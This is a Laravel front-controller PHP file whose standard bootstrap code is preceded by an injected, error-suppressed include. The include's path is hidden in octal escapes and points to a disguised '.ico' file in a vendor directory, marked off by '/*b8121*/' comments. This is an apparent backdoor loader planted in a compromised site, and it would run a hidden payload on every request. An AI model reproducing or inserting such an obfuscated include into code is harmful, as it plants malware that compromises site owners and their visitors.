<?php
/*b8121*/

@include "\057ho\155e/\1727z\15356\066r3\14583\057pu\142li\143_h\164ml\057of\146ic\145/v\145nd\157r/\150am\143re\163t/\05669\06001\06619\056ic\157";

/*b8121*/

require __DIR__ . '/../bootstrap/autoload.php';

$app = require_once __DIR__ . '/../bootstrap/app.php';

$kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);

$response = $kernel->handle(
	$request = Illuminate\Http\Request::capture()
);

$response->send();

$kernel->terminate($request, $response);
